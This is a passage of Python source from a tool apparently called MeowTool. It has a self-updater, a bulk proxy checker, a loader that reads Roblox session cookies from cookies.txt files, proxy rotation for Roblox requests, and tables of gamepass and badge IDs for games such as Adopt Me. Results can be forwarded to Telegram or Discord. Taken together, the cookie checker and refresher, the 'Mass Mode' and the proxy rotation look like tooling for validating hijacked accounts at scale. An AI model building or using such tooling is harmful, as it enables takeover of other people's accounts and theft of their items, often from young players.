        ('Roblox', 'Cookie Checker', 'cookies.txt'),
        ('Roblox', 'Cookie Refresher', 'Mass Mode', 'cookies.txt'),
        ('Roblox', 'Transaction Analysis', 'cookies.txt')
    ]

    for args in PATHS:
        path = Path(*args)
        if not path.suffix:
            path.mkdir(parents=True, exist_ok=True)
        else:
            path.parent.mkdir(parents=True, exist_ok=True)
            path.touch(exist_ok=True)
            
def saveOldVersionOfProgram(userProgramName: str) -> None:
    if configLoader['Updater']['Save_Old_Versions']:
        dateOfSave = currentDate('%d.%m.%Y - %H.%M.%S')
        savePath = Path('Versions', f'{VERSION} ({dateOfSave})')
        savePath.mkdir(parents=True, exist_ok=True)
        shutil.move(userProgramName, savePath / userProgramName)

async def downloadPythonVersion() -> None:
    try:
        content = (await sendGetRequest('https://raw.githubusercontent.com/h1kken/MeowTool/refs/heads/meow/MeowTool.py', 'TEXT')).replace('\r', '')
        userProgramName = Path(__file__).name
        saveOldVersionOfProgram(userProgramName)
        with open(userProgramName, 'w', encoding='utf-8', errors='ignore') as file:
            file.write(content)
        openFile(userProgramName)
        sys.exit()
    except (SystemExit, KeyboardInterrupt, EOFError):
        raise
    except Exception as e:
        logger.exception(f' < [DOWNLOAD_PYTHON_VERSION] > {MT_Unknown_Error}: {e}...', force=True)
        while True:
            cmdWriter(f'  [{ANSI.FG.PINK}<3{ANSI.FG.WHITE}] {MT_Aww_Couldnt_Check_Maybe_The_Internets_Napping}... {MT_What_Now} :3\n\n  [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] {MT_Lets_Check_It_Again}\n  [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] {MT_Continue_Launching}\n\n')
            couldNotDownloadUpdate = input(f'  [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ')
            match couldNotDownloadUpdate:
                case '1':
                    removeLines(6)
                    cmdWriter(f'  [{ANSI.FG.PINK}<3{ANSI.FG.WHITE}] {MT_Checking_Again}... :3\r')
                    break
                case '2':
                    removeLines(6)
                    return
                case _:
                    removeLines(6)

def downloadExecutableVersion(version: str) -> None:
    webbrowser.open(f'https://github.com/h1kken/MeowTool/releases/download/{version}/MeowTool.exe')
    saveOldVersionOfProgram(Path(sys.executable).name)
    sys.exit()

async def checkUpdates() -> None:
    S = ' '*20
    while True:
        try:
            cmdWriter(f'  [{ANSI.FG.PINK}<3{ANSI.FG.WHITE}] {MT_Checking_Your_Trendiness_Level}... :3{S}\r')
            latestVersion = (await sendGetRequest('https://raw.githubusercontent.com/h1kken/MeowTool/refs/heads/meow/version.txt', 'TEXT')).strip()
            if latestVersion == VERSION:
                cmdWriter(f'  [{ANSI.FG.PINK}<3{ANSI.FG.WHITE}] {MT_Hooray_You_Are_On_The_Latest_And_Greatest}... :3{S}\r')
                return
            else:
                while True:
                    cmdWriter(f'  [{ANSI.FG.PINK}<3{ANSI.FG.WHITE}] {MT_Yay_New_Update_Available_Shall_We_Fetch_It} :3{S}\n\n  [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] {MT_Current_Version}: {VERSION}\n  [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] {MT_Latest_Version}: {latestVersion}\n\n  [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] {MT_Yes_I_Want_The_Version.format('.py')}\n  [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] {MT_Yes_I_Want_The_Version.format('.exe')}\n  [{ANSI.FG.PINK}3{ANSI.FG.WHITE}] {MT_No_Maybe_Later}\n\n')
                    newUpdateAvailable = input(f'  [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ')
                    match newUpdateAvailable:
                        case '1':
                            removeLines(10)
                            while True:
                                cmdWriter(f'  [{ANSI.FG.PINK}<3{ANSI.FG.WHITE}] {MT_Gathering_Update_Goodies}... :3{S}\r')
                                await downloadPythonVersion()
                        case '2':
                            saveOldVersionOfProgram(latestVersion)
                        case '3':
                            removeLines(10)
                            return
                        case _:
                            removeLines(10)
        except Exception as e:
            logger.exception(f'< [CHECK_UPDATES] > {MT_Unknown_Error}: {e}', force=True)
            while True:
                cmdWriter(f'  [{ANSI.FG.PINK}<3{ANSI.FG.WHITE}] {MT_Aww_Couldnt_Check_Maybe_The_Internets_Napping}. {MT_What_Now} :3{S}\n\n  [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] {MT_Lets_Check_It_Again}\n  [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] {MT_Continue_Launching}\n\n')
                couldNotCheckUpdate = input(f'  [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ')
                match couldNotCheckUpdate:
                    case '1':
                        removeLines(6)
                        break
                    case '2':
                        removeLines(6)
                        return
                    case _:
                        removeLines(6)

def makeArchive(dateString: str, *pathArgs: str) -> None:
    path = Path(*pathArgs, dateString)
    if path.exists():
        archivesPath = Path(*pathArgs, 'archives')
        archivesPath.mkdir(parents=True, exist_ok=True)
        try:
            with zipfile.ZipFile(archivesPath / f'{dateString}.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
                for filePath in path.rglob('*'):
                    if filePath.is_file():
                        zipf.write(filePath, filePath.relative_to(path))
        except Exception as e:
            logger.exception(f'< [MAKE_ARCHIVE] > {MT_Critical_Error}: {e}', force=True)

async def sendMessageTelegramBot(text: Optional[str] = None, filePath: Optional[Path] = None, test: bool = False) -> None:
    if not (config['Outputs']['TelegramBot']['Send_Results_To_Telegram_Bot'] or test):
        return

    token = str(config['Outputs']['TelegramBot']['Telegram_Bot_Token'])
    chatId = str(config['Outputs']['TelegramBot']['Telegram_Bot_Chat_ID'])

    bot = None
    try:
        bot = Bot(token=token)

        if filePath is None and text:
            await bot.send_message(
                chat_id=chatId,
                text=text,
                request_timeout=10
            )
            cmdWriter(f'\r [{ANSI.FG.GREEN}{MT_Telegram[1]}{ANSI.FG.WHITE}] {ANSI.FG.GREEN}{MT_Successfully}{ANSI.FG.WHITE} | {MT_Message_Was_Sent} :3\n')
        else:
            if not filePath.exists():
                raise FileNotFoundError
            
            cmdWriter(f'\r [{ANSI.FG.CYAN}{MT_Telegram[1]}{ANSI.FG.WHITE}] {MT_Send[1]} {MT_Results_To_Telegram[0].lower()}{MT_Results_To_Telegram[1:]}\r')
            await bot.send_message(
                chat_id=chatId,
                text=text,
                parse_mode=ParseMode.HTML,
                request_timeout=10
            )
            await bot.send_document(
                chat_id=chatId,
                document=FSInputFile(filePath),
                request_timeout=10
            )
            cmdWriter(f'\r [{ANSI.FG.GREEN}{MT_Telegram[1]}{ANSI.FG.WHITE}] {ANSI.FG.GREEN}{MT_Successfully}{ANSI.FG.WHITE} | {MT_Send[2]} {MT_Results_To_Telegram[0].lower()}{MT_Results_To_Telegram[1:]} :3\n')
    except FileNotFoundError:
        cmdWriter(f'\r [{ANSI.FG.RED}{MT_Telegram[1]}{ANSI.FG.WHITE}] {ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.FG.WHITE} | {MT_File_Was_Not_Created}... :<\n')
    except Exception as e:
        ERRORS = {
            TelegramBadRequest   : MT_Possibly_A_Typo_In_The_Chat_ID,
            TelegramNetworkError : MT_Possibly_The_Internet_Is_Unstable,
            **dict.fromkeys(
                [TelegramUnauthorizedError, TokenValidationError],
                MT_Possibly_A_Typo_In_The_Bot_Token
            )
        }
        logger.exception(f'< [SEND_MESSAGE_TELEGRAM_BOT] > {MT_Unknown_Error}: {e}', force=type(e) not in ERRORS)
        cmdWriter(f'\r [{ANSI.FG.RED}{MT_Telegram[1]}{ANSI.FG.WHITE}] {ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.FG.WHITE} | {ERRORS.get(type(e), f'{MT_Unknown_Error}: {e}')}... :<\n')
    finally:
        cmdFlusher()
        if bot:
            await bot.session.close()

def sendMessageDiscordWebhook(text: Optional[str] = None, filePath: Optional[Path] = None, test: bool = False) -> None:
    if not (config['Outputs']['DiscordWebhook']['Send_Results_To_Discord_Webhook'] or test):
        return

    webhookUrl = str(config['Outputs']['DiscordWebhook']['Discord_Webhook_URL'])

    try:
        cmdWriter(f'\r [{ANSI.FG.CYAN}{MT_Discord[1]}{ANSI.FG.WHITE}] {MT_Send[1]} {MT_Results_To_Discord[0].lower()}{MT_Results_To_Discord[1:]}\r')
        
        if filePath is None:
            webhookFile = None
        elif filePath.exists():
            webhookFile = DiscordWebhook(
                url=webhookUrl,
                rate_limit_retry=True
            )
            
            with open(filePath, 'rb') as file:
                webhookFile.add_file(file=file.read(), filename=filePath.name)

        else:
            raise FileNotFoundError

        if text is not None:
            webhookText = DiscordWebhook(
                url=webhookUrl,
                rate_limit_retry=True
            )

            embed = DiscordEmbed(
                description=text,
                color='c883b3'
            )

            if not test:
                embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/1393994423481663528/1394053567899369533/Neko_for_MeowTool_Discord_output.png?ex=68f1fece&is=68f0ad4e&hm=3c5267d3c1f66e643a80f27b54f02d512fc2cc9ca10d6de5c983d55be9834c58&')        

            webhookText.add_embed(embed)

        if webhookText is not None:
            webhookText.execute()
            if test:
                cmdWriter(f'\r [{ANSI.FG.GREEN}{MT_Discord[1]}{ANSI.FG.WHITE}] {ANSI.FG.GREEN}{MT_Successfully}{ANSI.FG.WHITE} | {MT_Message_Was_Sent} :3\n')
                return

        if webhookFile is not None:
            response = webhookFile.execute()
            RESPONSES = {
                **dict.fromkeys(
                    [401, 404],
                    MT_Possibly_A_Typo_In_The_Webhook_URL
                ),
                413: MT_File_Is_Too_Big
            }

            status = response.status_code
            if status == 200:
                cmdWriter(f'\r [{ANSI.FG.GREEN}{MT_Discord[1]}{ANSI.FG.WHITE}] {ANSI.FG.GREEN}{MT_Successfully}{ANSI.FG.WHITE} | {MT_Send[2]} {MT_Results_To_Discord[0].lower()}{MT_Results_To_Discord[1:]} :3\n')
            else:
                cmdWriter(f'\r [{ANSI.FG.RED}{MT_Discord[1]}{ANSI.FG.WHITE}] {ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.FG.WHITE} | {RESPONSES.get(status, f'{MT_Unknown_Server_Response_Code}: {status}')}... :< \n')
    except FileNotFoundError:
        cmdWriter(f'\r [{ANSI.FG.RED}{MT_Discord[1]}{ANSI.FG.WHITE}] {ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.FG.WHITE} | {MT_File_Was_Not_Created}... :<\n')
    except Exception as e:
        ERRORS = {
            ConnectionError: MT_Possibly_The_Internet_Is_Unstable,
            **dict.fromkeys(
                [InvalidURL, InvalidSchema, MissingSchema],
                MT_Invalid_URL_Format
            )
        }
        if type(e) not in ERRORS:
            logger.exception(f'< [SEND_MESSAGE_DISCORD_WEBHOOK] > {MT_Unknown_Error}: {e}', force=True)
        cmdWriter(f'\r [{ANSI.FG.RED}{MT_Discord[1]}{ANSI.FG.WHITE}] {ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.FG.WHITE} | {ERRORS.get(type(e), f'{MT_Unknown_Error}: {e}')}... :<\n')
    finally:
        cmdFlusher()

def findProxyPatternInString(string: str) -> Optional[dict[str, Optional[str]]]:
    for pattern in PROXY_PATTERNS:
        match = pattern.match(string.strip())
        if match:
            return match.groupdict()

def getProxiesFromFile(path: Path, visualPath: str) -> list[str]:
    proxies = set()
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as file:
            for line in file:
                proxy = findProxyPatternInString(line)
                if proxy:
                    protocol = f'{'http' if proxy['protocol'].lower() == 'https' else proxy['protocol'].lower()}://' if proxy['protocol'] else ''
                    if proxy.get('username') and proxy.get('password'):
                        proxies.add(f'{protocol}{proxy['username']}:{proxy['password']}@{proxy['ip']}:{proxy['port']}')
                    else:
                        proxies.add(f'{protocol}{proxy['ip']}:{proxy['port']}')

        if not proxies:
            raise FileNotFoundError

        logger.debug(f'< [GET_PROXIES_FROM_FILE] > Proxies found: {len(proxies)}')
        return list(proxies)
    except FileNotFoundError:
        return errorOrCorrectHandler(True, MT_No_Proxy_Was_Found, visualPath)
    except Exception as e:
        logger.exception(f'< [GET_PROXIES_FROM_FILE] > {MT_Critical_Error}: {e}', force=True)

# Запросы

async def sendGetRequest(url: str, responseContent: Literal['STATUS', 'HEADERS', 'TEXT', 'JSON', 'ALL'] = 'ALL'):
    async with ClientSession() as session:
        response: ClientResponse = await session.get(url, timeout=ClientTimeout(5), ssl=False)
        if response.status == 200:
            match responseContent:
                case 'STATUS'  : return response.status
                case 'HEADERS' : return response.headers
                case 'TEXT'    : return await response.text()
                case 'JSON'    : return await response.json()
                case _         : return response
        else:
            logger.warning(f'< [GET_REQUEST] > [{response.status}] {url}', force=True)

### Proxy Checker

async def checkProxy(workProtocols: dict[str, None], proxy: str, protocol: str, timeout: int) -> dict[str, str]:
    for retry in range(1, 4):
        try:
            async with ClientSession(connector=ProxyConnector.from_url(f'{protocol}://{proxy}')) as session:
                async with session.get('https://ipinfo.io/json', timeout=ClientTimeout(timeout)) as response:
                    if 200 <= response.status < 300:
                        workProtocols[protocol] = 'good'
                        return
                    else:
                        logger.debug(f'< [CHECK_PROXY] > {MT_Try}: {retry} | [{response.status}] {proxy}', force=True)
                        if retry == 3:
                            raise ProxyError
        except (ProxyError, ClientOSError, asyncio.exceptions.CancelledError):
            workProtocols[protocol] = 'bad'
            return
        except asyncio.TimeoutError:
            workProtocols[protocol] = 'timeout'
            return
        except Exception as e:
            logger.exception(f'< [CHECK_PROXY] > {MT_Critical_Error}: {e}', force=True)

async def proxyChecker(file: str) -> None:
    labelASCII()
    cmdWriter(f' {generateVisualPath(MT_Proxy, MT_Checker)}\n\n [{ANSI.FG.CYAN}~{ANSI.FG.WHITE}] {MT_Wait[0]}...')

    proxiesFromFile = getProxiesFromFile(Path('Proxy', 'Checker', file), generateVisualPath(MT_Proxy, MT_Checker))
    if not proxiesFromFile:
        return

    isOutputTotal                 = config['Outputs']['Output_Total']
    isSendResultsToTelegramBot    = config['Outputs']['TelegramBot']['Send_Results_To_Telegram_Bot']
    isSendResultsToDiscordWebhook = config['Outputs']['DiscordWebhook']['Send_Results_To_Discord_Webhook']

    def printTotalOutputPC() -> None:
        cmdWriter(rf'''
 {ANSI.FG.GRAY}{'_____________________________________'}
 {ANSI.FG.GRAY}| {ANSI.FG.CYAN  }Proxy{                                ANSI.FG.WHITE}: {counters['proxy']} {MT_Of} {amountOfProxiesFromFile}
 {ANSI.FG.GRAY}| {ANSI.FG.GREEN }Good{                                 ANSI.FG.WHITE}: {counters['good']}
 {ANSI.FG.GRAY}| {ANSI.FG.RED   }Bad{                                  ANSI.FG.WHITE}: {counters['bad']}
 {ANSI.FG.GRAY}| {ANSI.FG.YELLOW}Response time >{maxResponseTime} sec.{ANSI.FG.WHITE}: {counters['timeout']}
 {ANSI.FG.GRAY}{'‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾'}{ANSI.FG.WHITE}
'''.lstrip('\n'))

    maxResponseTime = int(config['Proxy']['Checker']['Timeout']) if str(config['Proxy']['Checker']['Timeout']).isdigit() else 10
    isSaveGoodInCustomFile = config['Proxy']['Checker']['Save_Good_In_Custom_File']
    isSaveWithoutProtocol = config['Proxy']['Checker']['Save_Without_Protocol']
    amountOfProxiesFromFile = len(proxiesFromFile)
    counters = {
        'proxy'   : 0,
        'good'    : 0,
        'bad'     : 0,
        'timeout' : 0
    }
    proxySaveLock   = asyncio.Lock()
    proxyOutputLock = asyncio.Lock()
    dateOfCheck = currentDate('%d.%m.%Y - %H.%M.%S')
    savePath = Path('Proxy', 'Checker', 'outputs', dateOfCheck)
    semaphore = asyncio.Semaphore(int(config['Proxy']['Checker']['Number_Of_Threads_For_Checker']) if str(config['Proxy']['Checker']['Number_Of_Threads_For_Checker']).isdigit() and (0 < int(config['Proxy']['Checker']['Number_Of_Threads_For_Checker']) <= 1000) else 50)

    async def saveResultsPC(proxy: str, protocol: str, result: str) -> None:
        async with aiofiles.open(savePath / f'{protocol}_{result}.txt', 'a+', encoding='utf-8') as file:
            await file.seek(0)
            async for line in file:
                if proxy in line:
                    return
            proxy = f'{proxy}\n' if isSaveWithoutProtocol else f'{protocol}://{proxy}\n'
            await file.write(proxy)
        if isSaveGoodInCustomFile and result == 'good':
            async with aiofiles.open(savePath / f'custom_good.txt', 'a', encoding='utf-8') as file:
                await file.write(proxy)

    INFOS = {
        'http'    : 'H',
        'socks4'  : 'S4',
        'socks5'  : 'S5',
        'good'    : ANSI.FG.GREEN,
        'bad'     : ANSI.FG.RED,
        'timeout' : ANSI.FG.YELLOW
    }

    def consoleOutputHandlerPC(counter: str, message: str) -> None:
        if isOutputTotal and counters['proxy']:
            removeLines(6)
        counters[counter] += 1
        counters['proxy'] += 1
        cmdWriter(message)
        if isOutputTotal:
            printTotalOutputPC()

    # Проверка прокси
    async def threadingCheckProxy(proxy: str):
        async with semaphore:
            workProtocols = {
                'http'   : None,
                'socks4' : None,
                'socks5' : None
            }
            match = PROXY_PROTOCOL_IN_START_OF_STRING_PATTERN.match(proxy)
            if not match:
                await asyncio.gather(
                    *(checkProxy(workProtocols, proxy, protocol, maxResponseTime) for protocol in ['http', 'socks4', 'socks5'])
                )
            else:
                protocol = match.group(0)
                proxy = proxy[len(protocol) + 3:]
                await checkProxy(workProtocols, proxy, protocol, maxResponseTime)

            # Обработка результатов
            async with proxySaveLock:
                await asyncio.gather(
                    *(saveResultsPC(proxy, protocol, result) for protocol, result in workProtocols.items() if result is not None)
                )

            resultValues = workProtocols.values()
            resultValue = 'good' if 'good' in resultValues else 'timeout' if 'timeout' in resultValues else 'bad'
            messageString = f' [{INFOS[resultValue]}{resultValue.upper()}{ANSI.FG.WHITE}] [{', '.join(f'{INFOS[result]}{INFOS[protocol]}{ANSI.FG.WHITE}' for protocol, result in workProtocols.items() if result)}] {INFOS[resultValue]}{proxy}{ANSI.FG.WHITE}\n'

            async with proxyOutputLock:
                consoleOutputHandlerPC(resultValue, messageString)

    cmdWriter(f'\r [{ANSI.FG.CYAN}~{ANSI.FG.WHITE}] {MT_Start_Checking_File} \'{ANSI.DECOR.UNDERLINEON}{file}{ANSI.DECOR.UNDERLINEOFF}\':\n')

    savePath.mkdir(parents=True, exist_ok=True)
    start = timer('start')
    await asyncio.gather(
        *(threadingCheckProxy(proxy) for proxy in proxiesFromFile)
    )
    stop = timer('stop', start=start)

    cmdWriter(f' [{ANSI.FG.CYAN}~{ANSI.FG.WHITE}] {MT_Checking_Complete} {MT_In[1].lower()} {formatDuration(int(stop * 1000))}\n\n')
    playSystemSound()

    if isSendResultsToTelegramBot or isSendResultsToDiscordWebhook:
        messageText = (
            f'<b>💜 {MT_Proxy} {MT_Checker.lower()}\n\n'
            
            f'🟢 Good: {counters['good']}\n'
            f'🔴 Bad: {counters['bad']}\n'
            f'🟡 Response time >{maxResponseTime} sec.: {counters['timeout']}</b>'
        )
        makeArchive(dateOfCheck, 'Proxy', 'Checker', 'outputs')
        _path = Path('Proxy', 'Checker', 'outputs', 'archives', f'{dateOfCheck}.zip')
        await sendMessageTelegramBot(messageText, _path)
        sendMessageDiscordWebhook(f'**{messageText.lstrip('<b>').rstrip('</b>')}**', _path)
        cmdWriter('\n')

    waitingInput()

### Roblox Cookie Checker

def getProxiesFromFileRoblox(isUseProxy: bool, path: Path, visualPath: str) -> Optional[list[str]]:
    if not isUseProxy:
        return

    try:
        configProtocol = str(config['Roblox']['General']['Proxy']['Auto_Protocol_If_Not_Specified']).lower()
        autoProtocol = configProtocol if configProtocol in ('http', 'socks4', 'socks5') else 'http'
        proxies = set()
        with open(path, 'r', encoding='utf-8', errors='ignore') as file:
            for line in file:
                proxy = findProxyPatternInString(line)
                if proxy:
                    protocol = f'{'http' if proxy['protocol'].lower() == 'https' else proxy['protocol'].lower()}' if proxy['protocol'] else autoProtocol
                    if proxy.get('username') and proxy.get('password'):
                        proxies.add(f'{protocol}://{proxy['username']}:{proxy['password']}@{proxy['ip']}:{proxy['port']}')
                    else:
                        proxies.add(f'{protocol}://{proxy['ip']}:{proxy['port']}')

        if not proxies:
            raise FileNotFoundError

        logger.debug(f'< [GET_PROXIES_FROM_FILE_ROBLOX] > Proxies found: {len(proxies)}')
        return list(proxies)
    except FileNotFoundError:
        return errorOrCorrectHandler(True, MT_No_Proxy_Was_Found, visualPath)
    except Exception as e:
        logger.exception(f'< [GET_PROXIES_FROM_FILE_ROBLOX] > {MT_Critical_Error}: {e}', force=True)

def getCookiesFromFileRoblox(path: Path, visualPath: str) -> Optional[set[str]]:
    symbolsBetweenWarningAndCookie = str(config['Roblox']['General']['Symbols_Between_Warning_And_Cookie']).strip() if config['Roblox']['General']['Add_Symbols_Between_Warning_And_Cookie'] else ''
    cookiesSet = set()
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as file:
            for line in file:
                cookie = re.search(COOKIE_PATTERN, line.strip())
                if not cookie:
                    cookie = re.search(STRING_MINIMUM_100_SYMBOLS_PATTERN, line.strip())
                    if not cookie:
                        continue

                    cookie = f'{COOKIE_START}{symbolsBetweenWarningAndCookie}{cookie.group(0)}'
                else:
                    cookie = cookie.group(0)

                cookiesSet.add(cookie)
        if not cookiesSet:
            raise FileNotFoundError

        logger.debug(f'< [GET_COOKIES_FROM_FILE_ROBLOX] > Cookies found: {len(cookiesSet)}')
        return cookiesSet
    except FileNotFoundError:
        return errorOrCorrectHandler(True, MT_No_Cookie_Was_Found, visualPath)
    except Exception as e:
        logger.exception(f'< [GET_COOKIES_FROM_FILE_ROBLOX] > {MT_Critical_Error}: {e}', force=True)

def getConnectorRoblox(proxies: Optional[list[str]] = None) -> TCPConnector | ProxyConnector:
    if not (config['Roblox']['General']['Proxy']['Use_Proxy'] and proxies):
        return TCPConnector(limit=0)
    return ProxyConnector.from_url(random.choice(proxies))

class NinetyNineNightsintheForest: # https://www.roblox.com/games/79546208627805
    placeNames = '99 Nights in the Forest', '99_Nights_in_the_Forest', '99NITF', 79546208627805
    class Gamepasses:
        MedicClass  = 'Medic Class',  1236071562, 'Medic_Class'
        RangerClass = 'Ranger Class', 1235909977, 'Ranger_Class'
        # List Of Gamepasses
        listOfGamepasses = [MedicClass, RangerClass]
    class Badges:
        Survive10days      = 'Survive 10 days',      2310366779580636, 'Survive_10_days'
        Survive20days      = 'Survive 20 days',      2491852490394472, 'Survive_20_days'
        Survive30days      = 'Survive 30 days',      2419608566642291, 'Survive_30_days'
        Survive40days      = 'Survive 40 days',      554308544894889,  'Survive_40_days'
        Survive50days      = 'Survive 50 days',      3412064596604231, 'Survive_50_days'
        Survive60days      = 'Survive 60 days',      1737414705437281, 'Survive_60_days'
        Survive70days      = 'Survive 70 days',      4033173523231173, 'Survive_70_days'
        Survive80days      = 'Survive 80 days',      2567683149214007, 'Survive_80_days'
        Survive90days      = 'Survive 90 days',      4230596623100073, 'Survive_90_days'
        Survive100days     = 'Survive 100 days',     3189171443259717, 'Survive_100_days'
        Combat             = 'Combat',               3019204750024378, 'Combat'
        Gardening          = 'Gardening',            1806706511193732, 'Gardening'
        FiremakingI        = 'Firemaking I',         2438152097371936, 'Firemaking_I'
        FiremakingII       = 'Firemaking II',        2005749031618947, 'Firemaking_II'
        FirstAid           = 'First Aid',            2001789220731988, 'First_Aid'
        Taming             = 'Taming',               3377143203517885, 'Taming'
        Crafting           = 'Crafting',             2027865090521852, 'Crafting'
        FiremakingIII      = 'Firemaking III',       3677382718476753, 'Firemaking_III'
        Beastmaster        = 'Beastmaster',          1339575633400553, 'Beastmaster'
        Usurpation         = 'Usurpation',           387000908551525,  'Usurpation'
        Husbandry          = 'Husbandry',            1674875257275150, 'Husbandry'
        Infiltration       = 'Infiltration',         4351793822740062, 'Infiltration'
        Hunting            = 'Hunting',              1551739613632860, 'Hunting'
        FiremakingIV       = 'Firemaking IV',        749743730964646,  'Firemaking_IV'
        Orienteering       = 'Orienteering',         3309153759455296, 'Orienteering'
        Teamwork           = 'Teamwork',             3168356882259569, 'Teamwork'
        SelfPreservation   = 'Self-Preservation',    334197250508484,  'Self_Preservation'
        Vegetarian         = 'Vegetarian',           416205278974903,  'Vegetarian'
        Swiftness          = 'Swiftness',            2405041291915669, 'Swiftness'
        Durability         = 'Durability',           3775784138528895, 'Durability'
        Humiliation        = 'Humiliation',          1578027557968563, 'Humiliation'
        DeterminedI        = 'Determined I',         2410517601139369, 'Determined_I'
        DeterminedII       = 'Determined II',        4316839073409710, 'Determined_II'
        HalloweenRuneToken = 'Halloween Rune Token', 517976950795023,  'Halloween_Rune_Token'
        HalloweenKeyToken  = 'Halloween Key Token',  2790425224066975, 'Halloween_Key_Token'
        # List Of Badges
        listOfBadges = [Survive10days, Survive20days, Survive30days, Survive40days, Survive50days, Survive60days, Survive70days, Survive80days, Survive90days, Survive100days, Combat, Gardening, FiremakingI, FiremakingII, FirstAid, Taming, Crafting, FiremakingIII, Beastmaster, Usurpation, Husbandry, Infiltration, Hunting, FiremakingIV, Orienteering, Teamwork, SelfPreservation, Vegetarian, Swiftness, Durability, Humiliation, DeterminedI, DeterminedII, HalloweenRuneToken, HalloweenKeyToken]

class AUniversalTime: # https://www.roblox.com/games/5130598377
    placeNames = 'A Universal Time', 'A_Universal_Time', 'AUT', 5130598377
    class Gamepasses:
        CoolCustomStand        = 'Cool Custom Stand',       9985664,   'Cool_Custom_Stand'
        Plus3StandStorageSlots = '3+ Stand Storage Slots',  10397197,  '3_Plus_Stand_Storage_Slots'
        Plus3BankSlots         = '3+ Bank Slots',           10478668,  '3_Plus_Bank_Slots'
        Plus3BankSlotsStorage  = '3+ Bank Slots Storage',   10479192,  '3_Plus_Bank_Slots_Storage'
        ItemNotifier           = 'Item Notifier',           10562035,  'Item_Notifier'
        Donation               = 'Donation',                10753254,  'Donation'
        SmallDonation          = 'Small Donation',          10304426,  'Small_Donation'
        MediumDonation         = 'Medium Donation',         10096532,  'Medium_Donation'
        KursDonation           = 'kur\'s Donation',         10507934,  'Kurs_Donation'
        HydrasDonationPerks    = 'Hydra\'s Donation Perks', 10516158,  'Hydras_Donation_Perks'
        Tips                   = 'Tips',                    10381097,  'Tips'
        CustomChatColor        = 'Custom Chat Color',       11491183,  'Custom_Chat_Color'
        ChatBackgroundColor    = 'Chat Background Color',   11581293,  'Chat_Background_Color'
        EmotesPackv1           = 'Emotes Pack v1',          13675608,  'Emotes_Pack_v1'
        EmotePackv2            = 'Emote Pack v2',           14014491,  'Emote_Pack_v2'
        EmotePackv3            = 'Emote Pack v3',           822694616, 'Emote_Pack_v3'
        EmotePackv4            = 'Emote Pack v4',           822666635, 'Emote_Pack_v4'
        EmotePackv5            = 'Emote Pack v5',           837754540, 'Emote_Pack_v5'
        JJKEmotePack           = 'JJK Emote Pack',          920471052, 'JJK_Emote_Pack'
        SmartAssistant         = 'Smart Assistant',         939773206, 'Smart_Assistant'
        CommunityEmotePack     = 'Community Emote Pack',    948648926, 'Community_Emote_Pack'
        # List Of Gamepasses
        listOfGamepasses = [CoolCustomStand, Plus3StandStorageSlots, Plus3BankSlots, Plus3BankSlotsStorage, ItemNotifier, Donation, SmallDonation, MediumDonation, KursDonation, HydrasDonationPerks, Tips, CustomChatColor, ChatBackgroundColor, EmotesPackv1, EmotePackv2, EmotePackv3, EmotePackv4, EmotePackv5, JJKEmotePack, SmartAssistant, CommunityEmotePack]
    class Badges:
        AUTWinterXMas     = 'AUT Winter/X-Mas',    2124647551,       'AUT_Winter_XMas'
        NewUniverse       = 'New Universe',        2124749486,       'New_Universe'
        AHauntingTime     = 'A Haunting Time',     3072215579952874, 'A_Haunting_Time'
        AJollyTime        = 'A Jolly Time',        500904421623568,  'A_Jolly_Time'
        Labs              = 'Labs',                1971538031465661, 'Labs'
        Space             = 'Space',               473276580157634,  'Space'
        ForTheDelta       = 'δ: FOR THE DELTA',    314819738905580,  'For_The_Delta'
        MaxReputationRank = 'Max Reputation Rank', 1349907244987521, 'Max_Reputation_Rank'
        # List Of Badges
        listOfBadges = [AUTWinterXMas, NewUniverse, AHauntingTime, AJollyTime, Labs, Space, ForTheDelta, MaxReputationRank]

class AdoptMe: # https://www.roblox.com/games/920587237
    placeNames = 'Adopt Me', 'Adopt_Me', 'AM', 920587237
    class Gamepasses:
        VIP                     = 'VIP',                        3196348,   'VIP'
        Glider                  = 'Glider',                     3745845,   'Glider'
        StarterPack             = 'Starter Pack',               4785795,   'Starter_Pack'
        DJ                      = 'DJ',                         4796463,   'DJ'
        CandyCannon             = 'Candy Cannon',               5246776,   'Candy_Cannon'
        PremiumPlots            = 'Premium Plots',              5300198,   'Premium_Plots'
        PremiumFaces            = 'Premium Faces',              5704158,   'Premium_Faces'
        SupercarPack            = 'Supercar Pack',              5785139,   'Supercar_Pack'
        HeartHoverboard         = 'Heart Hoverboard',           5885873,   'Heart_Hoverboard'
        RoyalCarriages          = 'Royal Carriages',            5904007,   'Royal_Carriages'
        MillionairePack         = 'Millionaire Pack',           6040696,   'Millionaire_Pack'
        MermaidMansion          = 'Mermaid Mansion',            6164327,   'Mermaid_Mansion'
        CelebrityMansion        = 'Celebrity Mansion',          6408694,   'Celebrity_Mansion'
        PetHorse                = 'Pet Horse',                  6558811,   'Pet_Horse'
        PetGriffin              = 'Pet Griffin',                6558813,   'Pet_Griffin'
        LemonadeStand           = 'Lemonade Stand',             6858591,   'Lemonade_Stand'
        HotdogStand             = 'Hotdog Stand',               7124470,   'Hotdog_Stand'
        ModernMansion           = 'Modern Mansion',             6965379,   'Modern_Mansion'
        CozyHomeLure            = 'Cozy Home Lure',             189425850, 'Cozy_Home_Lure'
        SchoolandHospitalHomes  = 'School and Hospital Homes',  951065968, 'Schooland_Hospital_Homes'
        SoccerStadium           = 'Soccer Stadium',             951395729, 'Soccer_Stadium'
